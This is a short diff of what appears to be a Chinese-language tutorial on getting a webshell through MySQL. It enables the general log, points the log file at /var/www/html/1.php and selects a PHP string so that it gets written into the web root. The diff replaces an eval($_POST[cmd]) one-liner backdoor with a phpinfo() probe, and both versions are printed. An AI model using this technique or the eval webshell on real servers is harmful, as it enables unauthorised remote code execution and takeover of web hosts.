@@ -249,7 +249,7 @@ set global general_log = on;  开启general log模式
 
 set global general_log_file = '/var/www/html/1.php';   设置日志目录为shell地址
 
-select \'<?php eval($_POST[cmd]);?>\'  写入shell
+select '<?php phpinfo();?>';  写入shell
 ```   
 
 
